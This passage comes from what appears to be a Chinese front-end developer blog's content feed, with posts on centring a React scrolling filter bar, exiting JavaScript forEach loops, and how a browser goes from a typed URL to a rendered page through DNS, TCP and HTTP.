punctuation">}</span><span class="token selector">.filter-content </span><span class="token punctuation">{</span>    <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>    <span class="token property">padding-right</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">27</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>    <span class="token selector">.filter-list </span><span class="token punctuation">{</span>        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>        <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>        <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">90</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#333333</span><span class="token punctuation">;</span>        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">-webkit-overflow-scrolling</span><span class="token punctuation">:</span> touch<span class="token punctuation">;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">32</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">font-family</span><span class="token punctuation">:</span>PingFangSC-Light,PingFang SC<span class="token punctuation">;</span>        <span class="token property">font-weight</span><span class="token punctuation">:</span><span class="token number">300</span><span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>        <span class="token property">margin-right</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">100</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token selector">.filter-item </span><span class="token punctuation">{</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// flex-basis: 17px;</span>            <span class="token property">flex-shrink</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token property">white-space</span><span class="token punctuation">:</span> nowrap<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">90</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.active</span><span class="token punctuation">{</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">36</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">90</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>            <span class="token property">flex</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.zhishi</span><span class="token punctuation">{</span>            <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url</span><span class="token punctuation">(</span><span class="token string">"./../img/zhishi.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>            <span class="token property">background-size</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">6</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>            <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">10</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>            <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>            <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">50%</span>, <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">999</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token selector">.shadow</span><span class="token punctuation">{</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">90</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">133</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">101</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span><span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token number">270</span>deg,<span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">0%</span>,<span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">255</span>,<span class="token number">0.14</span><span class="token punctuation">)</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector">.filte-btn</span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url</span><span class="token punctuation">(</span><span class="token string">"./../img/shaixuan.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>        <span class="token property">background-size</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">40</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">40</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector">.filte-btn-content </span><span class="token punctuation">{</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">90</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">27</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">74</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">justify-content</span><span class="token punctuation">:</span> flex-end<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>想要居中展示首先是需要找到中心点，然后在点击是计算偏移量，把对应的标签滚动到中心位置</p><pre class="line-numbers language-js"><code class="language-js">filterBarClick <span class="token operator">=</span> param <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> value<span class="token punctuation">,</span> text <span class="token punctuation">}</span> <span class="token operator">=</span> param<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            filterSelect<span class="token punctuation">:</span> value        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> dom <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>refs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取点击时当前标签的DOM</span>        <span class="token keyword">let</span> valDom <span class="token operator">=</span> dom<span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取标签父元素DOM</span>        <span class="token keyword">let</span> contentDom <span class="token operator">=</span> dom<span class="token punctuation">.</span>filterBar<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//计算当前标签到最左侧的宽度</span>        <span class="token keyword">let</span> valLeft <span class="token operator">=</span> valDom<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//计算当前标签本身的宽度</span>        <span class="token keyword">let</span> valWidth <span class="token operator">=</span> valDom<span class="token punctuation">.</span>clientWidth<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//当前标签中心点到最左侧的距离</span>        <span class="token keyword">let</span> valCenter <span class="token operator">=</span> valLeft <span class="token operator">+</span> valWidth <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//可视屏幕宽度</span>        <span class="token keyword">let</span> clientWidth <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>offsetWidth<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//可视屏幕中心点（减去的30是列表两边的15像素的留白）</span>        <span class="token keyword">let</span> center <span class="token operator">=</span> <span class="token punctuation">(</span>clientWidth <span class="token operator">-</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//计算当前标签中心点和屏幕中心点的偏移量 然后滚动相应的距离</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>valCenter <span class="token operator">></span> center<span class="token punctuation">)</span> <span class="token punctuation">{</span>            contentDom<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                left<span class="token punctuation">:</span> valCenter <span class="token operator">-</span> center<span class="token punctuation">,</span>                behavior<span class="token punctuation">:</span> <span class="token string">'smooth'</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            contentDom<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                left<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                behavior<span class="token punctuation">:</span> <span class="token string">'smooth'</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>forEach跳出循环</title>
      <link href="2020/02/02/forEach%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF/"/>
      <url>2020/02/02/forEach%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在forEach中，不能使用 continue 和 break ，可以使用 return 或 return false 跳出循环，效果与 for 中 continue 一样。注意该方法无法一次结束所有循环。</p><h2 id="跳出本次循环"><a href="#跳出本次循环" class="headerlink" title="跳出本次循环"></a>跳出本次循环</h2><p>forEach 跳出本次循环，使用return</p><pre class="line-numbers language-js"><code class="language-js">    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>item <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// item == 3时，执行不到该部分，结束本次循环</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="跳出整个循环"><a href="#跳出整个循环" class="headerlink" title="跳出整个循环"></a>跳出整个循环</h2><p>forEach 跳出整个循环，需要抛出异常</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>item <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            thorw <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结束整体循环</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="跳出嵌套循环"><a href="#跳出嵌套循环" class="headerlink" title="跳出嵌套循环"></a>跳出嵌套循环</h2><p>forEach 跳出嵌套循环</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>item <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    thorw <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结束整体循环</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//try不能单独存在</span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">--</span><span class="token operator">></span>            <span class="token comment" spellcheck="true">//内层的catch不能存在，不然会捕获异常，只结束内层forEach</span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在最外层捕获异常，可结束嵌套循环</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道面试题来了解浏览器工作原理</title>
      <link href="2019/10/14/jsUrl/"/>
      <url>2019/10/14/jsUrl/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为前端工程师，几乎是每天都要与各种浏览器打交道。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7rxb0rvmmj30u00gat9q.jpg" alt></p><p>理解浏览器是如何工作的，对我们做业务的技术选型、架构设计等都有非常重要的作用，可以让我们准确的评估web开的项目的可行性，站在更高维度审视页面，以及在快节奏的技术迭代中把握住问题的本质。</p><p>那么我们就从一道面试题<code>在浏览器里面，从输入URL到展示页面，这过程发生了什么？</code>来解开浏览器神秘的面纱</p><p>在了解流程之前我们先来看一下浏览器的架构：</p><h2 id="浏览器架构"><a href="#浏览器架构" class="headerlink" title="浏览器架构"></a>浏览器架构</h2><p>当代现有的浏览器主要由：</p><ul><li>用户界面（<strong>The user interface</strong>）、</li><li>浏览器引擎（<strong>The browser engine</strong>）、</li><li>呈现引擎（<strong>The rendering engine</strong>）、</li><li>网络（<strong>Networking</strong>）、</li><li>JavasScript 解释器（<strong>JavaScript interpreter</strong>）、</li><li>用户界面后端（<strong>UI backend</strong>）、</li><li>数据存储组成（<strong>Data storage</strong>）。</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t3m3yfqwj316g0skdij.jpg" alt="image-20191010144108447"></p><ol><li><strong>用户界面</strong> - 包括地址栏、前进/后退按钮、书签菜单等。除了浏览器主窗口显示的您请求的页面外，其他显示的各个部分都属于用户界面。</li><li><strong>浏览器引擎</strong> - 在用户界面和呈现引擎之间传送指令。</li><li><strong>渲染引擎</strong> - 负责显示请求的内容。如果请求的内容是 HTML，它就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。</li><li><strong>网络</strong> - 用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。</li><li><strong>用户界面后端</strong> - 用于绘制基本的窗口小部件，比如组合框和窗口。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。</li><li><strong>JavaScript 解释器</strong>。用于解析和执行 JavaScript 代码。</li><li><strong>数据存储</strong>。这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。</li></ol><p>那么在了解完浏览器的架构之后，再来看一下URL的解析过程</p><h2 id="浏览器解析过程"><a href="#浏览器解析过程" class="headerlink" title="浏览器解析过程"></a>浏览器解析过程</h2><ul><li>DNS解析</li><li>TCP连接</li><li>发送HTTP请求</li><li>服务器处理请求并返回HTTP报文</li><li>浏览器解析渲染过程</li></ul><h3 id="DNS解析解析过程"><a href="#DNS解析解析过程" class="headerlink" title="DNS解析解析过程"></a>DNS解析解析过程</h3><p>当发送一个url请求时，不管这个url是web页面的url还是web页面上的每个资源的url，浏览器都会开启一个线程处理该请求，同时在远程DNS服务器上启动一个DNS查询，这能使浏览器获得请求对应的IP地址</p><ul><li>本地DNS服务器拿到请求后会首先查询它的缓存记录，如果缓存有这条记录的话就直接返回。这个时候拿到的ip地址，会被标记为非权威服务器的应答。</li><li>如果没有，本地DNS服务器还要向DNS根服务器进行查询（会从配置文件里面读取13个根域名服务器的地址，然后向其中一台发起请求。）</li><li>根DNS服务器拿到这个请求后，告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。这种过程是迭代的过程,（比如知道他是com.这个顶级域名下的，所以就会返回com域中的NS记录。）</li><li>然后本地DNS服务器继续向域服务器发出请求，在这个例子中，请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址，（比如，com域的服务器发现你这请求是baidu.com这个域的，一查发现了这个域的NS，那我就返回给你，你再去查。）</li><li>最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器把IP地址返回给用户电脑，并把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。（比如，向baidu.com这个域的权威服务器发起请求，baidu.com收到之后，查了下有www的这台主机，就把这个IP返回给你了，然后ISPDNS拿到了之后，将其返回给了客户端，并且把这个保存在高速缓存中。）</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t4xi674nj30m80ee0x6.jpg" alt></p><p>网址的解析是一个从右向左的过程: com -&gt; google.com -&gt; <a href="http://www.google.com；" target="_blank" rel="noopener">www.google.com；</a></p><p>事实上，真正的网址是<a href="http://www.google.com.，这个.对应的就是根域名服务器，默认情况下所有的网址的最后一位都是.，既然是默认情况下，为了方便用户，通常都会省略，浏览器在请求DNS的时候会自动加上，所有网址真正的解析过程为" target="_blank" rel="noopener">www.google.com.，这个.对应的就是根域名服务器，默认情况下所有的网址的最后一位都是.，既然是默认情况下，为了方便用户，通常都会省略，浏览器在请求DNS的时候会自动加上，所有网址真正的解析过程为</a>: . -&gt; .com -&gt; google.com. -&gt; <a href="http://www.google.com.。" target="_blank" rel="noopener">www.google.com.。</a></p><h4 id="DNS域名类别"><a href="#DNS域名类别" class="headerlink" title="DNS域名类别"></a>DNS域名类别</h4><table><thead><tr><th>名称</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>根域</td><td>DNS域名使用时，规定由尾部局点(.)来指定名称位于根或者更高级的域层次结构</td><td>单个句点(.)或者句点用于末尾的名称</td></tr><tr><td>顶级域</td><td>用于指示某个国家/地区或者组织使用的名称类</td><td>.com</td></tr><tr><td>第二层域</td><td>个人或者组织在Internet上使用的注册名称</td><td>baidu.com</td></tr><tr><td>子域</td><td>已注册的二级域名派生的域名，同属的讲就是网站名</td><td><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></td></tr><tr><td>主机名</td><td>通常情况下，DNS域名的最左侧的标签标示网络上的特定计算机，如h1</td><td>h1.<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></td></tr></tbody></table><h3 id="TCP建立连接"><a href="#TCP建立连接" class="headerlink" title="TCP建立连接"></a>TCP建立连接</h3><p>在http消息发送前，需要建立客户端与服务器的TCP链接，也就是进行所谓的<strong>三次握手</strong>。<br>TCP是因特网中的传输层协议，使用<a href="[https://baike.baidu.com/item/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%8D%8F%E8%AE%AE](https://baike.baidu.com/item/三次握手协议)">三次握手协议</a>建立连接。当主动方发出SYN连接请求后，等待对方回答SYN+ACK，并最终对对方的 SYN 执行 ACK 确认。这种建立连接的方法可以防止产生错误的连接，TCP使用的流量控制协议是可变大小的滑动窗口协议。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t5oj4m3fj30el0cjac8.jpg" alt></p><p>TCP三次握手的过程如下：</p><ol><li>客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。</li><li>服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入<a href="https://baike.baidu.com/item/SYN_RECV" target="_blank" rel="noopener">SYN_RECV</a>状态。</li><li>客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。</li></ol><p>三次握手完成，TCP客户端和服务器端成功地建立连接，可以开始传输数据了。</p><h3 id="发起HTTP请求"><a href="#发起HTTP请求" class="headerlink" title="发起HTTP请求"></a>发起HTTP请求</h3><p>进过TCP3次握手之后，浏览器发起了http的请求;</p><p>chrome浏览器查看报文首部信息：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t677wqrfj30ws0hoahf.jpg" alt></p><h3 id="服务器请求处理"><a href="#服务器请求处理" class="headerlink" title="服务器请求处理"></a>服务器请求处理</h3><p>现在请求只是成功达到了服务器，接下来服务器需要响应浏览器的请求。<br>服务器端收到请求后的由web服务器（准确说应该是http服务器）处理请求，诸如Apache、Ngnix、IIS等。web服务器解析用户请求，知道了需要调度哪些资源文件，再通过相应的这些资源文件处理用户请求和参数，并调用数据库信息，最后将结果通过web服务器返回给浏览器客户端。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t6gbd1qjj30mg06lwgt.jpg" alt></p><p>在HTTP里，有请求就会有响应，哪怕是错误信息。这里我们同样看下响应报文的组成结构：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7t6hey2k0j30hd04ogmi.jpg" 